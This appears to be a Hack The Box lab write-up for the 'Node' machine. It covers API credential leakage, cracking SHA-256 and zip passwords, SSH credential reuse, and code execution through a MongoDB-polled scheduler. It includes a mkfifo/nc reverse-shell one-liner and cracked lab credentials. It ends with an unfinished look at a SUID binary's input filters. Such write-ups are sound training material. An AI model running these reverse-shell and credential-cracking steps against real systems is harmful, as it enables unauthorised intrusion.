---
tags: 
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/11680a85eaa657026b92b815be86e366.png)

- Machine : https://app.hackthebox.com/machines/Node
- Reference : https://alamot.github.io/node_writeup/
- Solved : 2025.2.20. (Thu) (Takes 0days)

## Summary
---


### Key Techniques:


---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.58
Performing quick port scan on 10.10.10.58...
Found open ports: 22,3000
Performing detailed scan on 10.10.10.58...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 02:35 MST
Nmap scan report for 10.10.10.58
Host is up (0.13s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.95 seconds
```

2 ports are open : ssh(22), hadoop(3000)
I think it worths to visit hadoop first.
Given the result including `/login`, I think http service is running there.

### http(3000)

![](attachments/node_1.png)

Looks like a old "MyPlace" service-look page.
Maybe the team members names might be useful later.

![](attachments/node_2.png)

It has login page, but couldn't get into it with easy credentials.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://10.10.10.58:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt --exclude-length 3861
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.58:3000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          3861
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 173] [--> /uploads/]
/assets               (Status: 301) [Size: 171] [--> /assets/]
/vendor               (Status: 301) [Size: 171] [--> /vendor/]
```

It has several subpages, but all redirected to the same page.
Instead, I observed that there are some js files called while loading the pages.

# Get Credential of `myP14ceAdm1nAcc0uNT`

app.js:

```javascript
var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});
```

home.js:

```javascript
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

login.js:

```javascript
var controllers = angular.module('controllers');

controllers.controller('LoginCtrl', function ($scope, $http, $location) {
  $scope.authenticate = function () {
    $scope.hasError = false;

    $http.post('/api/session/authenticate', {
      username: $scope.username,
      password: $scope.password
    }).then(function (res) {
      if (res.data.success) {
        $location.path('/admin');
      }
      else {
        $scope.hasError = true;
        $scope.alertMessage = 'Incorrect credentials were specified';
      }
    }, function (resp) {
      $scope.hasError = true;
      $scope.alertMessage = 'An unexpected error occurred';
    });
  };
});
```

admin.js:

```javascript
var controllers = angular.module('controllers');

controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }

  $http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

profile.js:

```javascript
var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```

`home.js` is calling `/api/users/latest` to compare with current user.
Maybe this reveals all existing users.

![](attachments/node_3.png)

```json
0	
_id	"59a7368398aa325cc03ee51d"
username	"tom"
password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
is_admin	false
1	
_id	"59a7368e98aa325cc03ee51e"
username	"mark"
password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
is_admin	false
2	
_id	"59aa9781cced6f1d1490fce9"
username	"rastating"
password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
is_admin	false
```

It is! There are 3 usernames found which are on the main page.
Also it contains passwords for all but none of them are admin.

Also, I modified the URL to `/api/users`, and it shows one more user credential.

![](attachments/node_4.png)

 ```bash
_id	"59a7365b98aa325cc03ee51c"
username	"myP14ceAdm1nAcc0uNT"
password	"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af"
is_admin	true
```

The user `myP14ceAdm1nAcc0uNT` is an admin, and I got its password hash!

```bash
┌──(kali㉿kali)-[~/htb]
└─$ hash-identifier         
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
```

Given the hash seems to be a SHA256 hash, let's crack the hash using `hashcat`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ hashcat -m 1400 -a 0 hash /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1436/2937 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt.gz: 33553434 byteDictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07...34d0af
Time.Started.....: Thu Feb 20 03:35:58 2025 (0 secs)
Time.Estimated...: Thu Feb 20 03:35:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    16197 H/s (0.06ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/14344385 (0.00%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> letmein
Hardware.Mon.#1..: Util: 51%

Started: Thu Feb 20 03:35:36 2025
Stopped: Thu Feb 20 03:35:59 2025
```

The cracked password for `myP14ceAdm1nAcc0uNT` is `manchester`.

# Shell as `mark`

### Backup file

![](attachments/node_5.png)

With the found credential, I got signed in, and saw that there is "Download Backup" button.
Let's download the backup file.

![](attachments/node_6.png)

The file seems to be encoded with base64. I decoded it into `myplace.zip`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat myplace.backup | base64 -d > myplace.zip


┌──(kali㉿kali)-[~/htb]
└─$ file myplace.zip
myplace.zip: Zip archive data, at least v1.0 to extract, compression method=store
```

I tried to unzip it, but it's asking password.

```bash
┌──(kali㉿kali)-[~/htb/myplace]
└─$ unzip myplace.zip 
Archive:  myplace.zip
   creating: var/www/myplace/
[myplace.zip] var/www/myplace/package-lock.json password: 
```

Let's use `fcrackzip` to crack the password.

```bash
┌──(kali㉿kali)-[~/htb/myplace]
└─$ fcrackzip -uDp /usr/share/wordlists/rockyou.txt myplace.zip   


PASSWORD FOUND!!!!: pw == magicword
```

The cracked password of zip file is `magicword`.

```bash
┌──(kali㉿kali)-[~/htb/myplace]
└─$ unzip myplace.zip   
Archive:  myplace.zip
[myplace.zip] var/www/myplace/package-lock.json password: 
  inflating: var/www/myplace/package-lock.json  
   creating: var/www/myplace/node_modules/
   creating: var/www/myplace/node_modules/serve-static/
  inflating: var/www/myplace/node_modules/serve-static/README.md  
  inflating: var/www/myplace/node_modules/serve-static/index.js  
  inflating: var/www/myplace/node_modules/serve-static/LICENSE 
<SNIP>
```

After extract the files, I enumerated through the web files.
And found `app.js` contains DB credentials.

```bash
┌──(kali㉿kali)-[~/…/myplace/var/www/myplace]
└─$ cat app.js       

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

`mark` : `5AYRft73VtFpc84k` is a credential for mongodb, but might be working on ssh(22) service as well.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ssh mark@10.10.10.58         
The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.58' (ED25519) to the list of known hosts.
mark@10.10.10.58's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ whoami
mark
mark@node:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
```

Then, I got `mark`'s shell!

# Shell as `tom`

### Enumeration

Let's run `LinPEAS`.

```bash
╔══════════╣ Users with console
mark:x:1001:1001:Mark,,,:/home/mark:/bin/bash                               
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1000:tom,,,:/home/tom:/bin/bash


╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid

<SNIP>                                                      
-rwsr-xr-- 1 root admin 17K Sep  3  2017 /usr/local/bin/backup (Unknown SUID binary!)  
<SNIP>


╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes              
<SNIP>
tom       1237  0.0  5.4 1008568 41316 ?       Ssl  09:27   0:01 /usr/bin/node /var/scheduler/app.js
tom       1239  1.1  7.3 1044880 55864 ?       Ssl  09:27   1:03 /usr/bin/node /var/www/myplace/app.js
```

There's  a binary that SUID is set.
And `tom` is running nodeJS service.

```bash
mark@node:~$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount


mark@node:~$ ls -al /usr/local/bin/backup
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

Wanted to run `/usr/local/bin/backup`, but cannot run as `mark`.

```bash
mark@node:~$ cat /etc/group | grep admin
lpadmin:x:115:tom
admin:x:1002:tom,root
```

I need to privesc to `tom` first.

### Mongodb command injection

Let's investigate `/var/scheduler/app.js` which is run by `tom`.

```bash
mark@node:/var/scheduler$ cat app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

It seems that the service is connected with "mongodb" service locally.
Then, it's connecting to `scheduler` db, and `tasks` collection, and runs whatever set `doc` as  `cmd`. Through this, I can make a command run by `tom`.

```bash
mark@node:/var/scheduler$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
MongoDB shell version: 3.2.16
connecting to: localhost:27017/scheduler
> use scheduler;
switched to db scheduler
> db.tasks.find();
> db.tasks.insertOne({ cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 9000 >/tmp/f" });
{
        "acknowledged" : true,
        "insertedId" : ObjectId("67b780c5316b477254b06736")
}
```

Then, I waited for a while with listener set.

```shell
┌──(kali㉿kali)-[~/htb]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 48080
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
$ whoami
tom
```

I got `tom`'s shell!



# Shell as `root`

Let's investigate `/var/www/myplace/app.js` which is run by `tom`.

```javascript
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';


  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
```

The binary `/usr/local/bin/backup` takes 3 arguments : `-q`, `backup_key`, "directory or file".

```bash
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /home/tom/user.txt
<backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740a                        <4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /h                        ome/tom/user.txt
UEsDBAoACQAAAKJLVFplTbXcLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAA9/1tmff9bZndXgLAAEEAAAAAAToAwAAwSTiDsBYm+hb5FENmRu4wmGhjqpE2NqCmp4IMcH6kb9B/OrX38gzRsaLx8GNUEsHCGVNtdwtAAAAIQAAAFBLAQIeAwoACQAAAKJLVFplTbXcLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQAD3/W2Z3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA=



┌──(kali㉿kali)-[~/htb]
└─$ echo 'UEsDBAoACQAAAKJLVFplTbXcLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAA9/1tmff9bZndXgLAAEEAAAAAAToAwAAwSTiDsBYm+hb5FENmRu4wmGhjqpE2NqCmp4IMcH6kb9B/OrX38gzRsaLx8GNUEsHCGVNtdwtAAAAIQAAAFBLAQIeAwoACQAAAKJLVFplTbXcLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQAD3/W2Z3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA=' | base64 -d > user.txt.zip



┌──(kali㉿kali)-[~/htb]
└─$ unzip user.txt.zip 
Archive:  user.txt.zip
[user.txt.zip] home/tom/user.txt password: 
```

It's asking password, but I can reuse the password I found previously : `magicword`.

I can also track it with `ltrace`.

```bash
tom@node:/$ ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /home/tom/user.txt                         
<al/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52                        <9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104                        d474 /home/tom/user.txt                                                     
__libc_start_main(0x80489fd, 4, 0xff8f4314, 0x80492c0 <unfinished ...>      
geteuid()                                        = 1000                     
setuid(1000)                                     = 0                        
strcmp("-q", "-q")                               = 0                        
strncpy(0xff8f41d8, "45fac180e9eee72f4fd2d9386ea7033e"..., 100) = 0xff8f41d8
strcpy(0xff8f41c1, "/")                          = 0xff8f41c1               
strcpy(0xff8f41cd, "/")                          = 0xff8f41cd               
strcpy(0xff8f4157, "/e")                         = 0xff8f4157               
strcat("/e", "tc")                               = "/etc"                   
strcat("/etc", "/m")                             = "/etc/m"                 
strcat("/etc/m", "yp")                           = "/etc/myp"               
strcat("/etc/myp", "la")                         = "/etc/mypla"             
strcat("/etc/mypla", "ce")                       = "/etc/myplace"           
strcat("/etc/myplace", "/k")                     = "/etc/myplace/k"         
strcat("/etc/myplace/k", "ey")                   = "/etc/myplace/key"       
strcat("/etc/myplace/key", "s")                  = "/etc/myplace/keys"      
fopen("/etc/myplace/keys", "r")                  = 0x95cf008                
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x95cf008) = 0xff8f3d6f  
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n") = 64                   
strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "a01a6aa5aaf1d7729f35c8278daae30f"...) = -1                                                               
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x95cf008) = 0xff8f3d6f  
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n") = 64                   
strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "45fac180e9eee72f4fd2d9386ea7033e"...) = 0                                                                
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x95cf008) = 0xff8f3d6f  
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n") = 64                   
strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "3de811f4ab2b7543eaf45df611c2dd25"...) = 1                                                                
fgets("\n", 1000, 0x95cf008)                     = 0xff8f3d6f               
strcspn("\n", "\n")                              = 0                        
strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "") = 1                       
fgets(nil, 1000, 0x95cf008)                      = 0                        
strstr("/home/tom/user.txt", "..")               = nil                      
strstr("/home/tom/user.txt", "/root")            = nil                      
strchr("/home/tom/user.txt", ';')                = nil                      
strchr("/home/tom/user.txt", '&')                = nil                      
strchr("/home/tom/user.txt", '`')                = nil                      
strchr("/home/tom/user.txt", '$')                = nil                      
strchr("/home/tom/user.txt", '|')                = nil                      
strstr("/home/tom/user.txt", "//")               = nil                      
strcmp("/home/tom/user.txt", "/")                = 1                        
strstr("/home/tom/user.txt", "/etc")             = nil                      
strcpy(0xff8f3b7b, "/home/tom/user.txt")         = 0xff8f3b7b               
getpid()                                         = 22260                    
time(0)                                          = 1740080427               
clock(0, 0, 0, 0)                                = 1472                     
srand(0x6552c12, 0x575c32d1, 0x6552c12, 0x804918c) = 0                      
rand(0, 0, 0, 0)                                 = 0x717f7084               
sprintf("/tmp/.backup_1904177284", "/tmp/.backup_%i", 1904177284) = 23      
sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_1904177284", "/home/tom/user.txt") = 83             
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>                
--- SIGCHLD (Child exited) ---                                              
<... system resumed> )                           = 0                        
access("/tmp/.backup_1904177284", 0)             = 0                        
sprintf("/usr/bin/base64 -w0 /tmp/.backup"..., "/usr/bin/base64 -w0 %s", "/tmp/.backup_1904177284") = 43                                                
system("/usr/bin/base64 -w0 /tmp/.backup"...UEsDBAoACQAAAKJLVFplTbXcLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAA9/1tmfagrdndXgLAAEEAAAAAAToAwAAdYU4J46FY/jWGU7Y86BKJydYOrhD0oSJLtGeSO5FWHHR83xCho7jEH2nAgm5UEsHCGVNtdwtAAAAIQAAAFBLAQIeAwoACQAAAKJLVFplTbXcLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQAD3/W2Z3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA= <no return ...>                                                                    
--- SIGCHLD (Child exited) ---                                              
<... system resumed> )                           = 0                        
remove("/tmp/.backup_1904177284")                = 0                        
fclose(0x95cf008)                                = 0                        
+++ exited (status 0) +++  
```

From the following part, I can find the password :

```cpp
sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_1904177284", "/home/tom/user.txt") = 83             
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>   
```

Also, I can see that it's loading `/etc/myplace/keys`.

```cpp
strcat("/e", "tc")                               = "/etc"                   
strcat("/etc", "/m")                             = "/etc/m"                 
strcat("/etc/m", "yp")                           = "/etc/myp"               
strcat("/etc/myp", "la")                         = "/etc/mypla"             
strcat("/etc/mypla", "ce")                       = "/etc/myplace"           
strcat("/etc/myplace", "/k")                     = "/etc/myplace/k"         
strcat("/etc/myplace/k", "ey")                   = "/etc/myplace/key"       
strcat("/etc/myplace/key", "s")                  = "/etc/myplace/keys"      
fopen("/etc/myplace/keys", "r")                  = 0x95cf008    
```

Let's see what's in it.

```shell
$ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

The key I've been using was the second one.

```cpp
strstr("/home/tom/user.txt", "..")               = nil                      
strstr("/home/tom/user.txt", "/root")            = nil                      
strchr("/home/tom/user.txt", ';')                = nil                      
strchr("/home/tom/user.txt", '&')                = nil                      
strchr("/home/tom/user.txt", '`')                = nil                      
strchr("/home/tom/user.txt", '$')                = nil                      
strchr("/home/tom/user.txt", '|')                = nil                      
strstr("/home/tom/user.txt", "//")               = nil                      
strcmp("/home/tom/user.txt", "/")                = 1                        
strstr("/home/tom/user.txt", "/etc")             = nil              
```

Also, it's noticeable that there are many filters for the `__dir` argument.

> It's buffer overflow... So no need for OSCP for now.
> Let's visit it later!
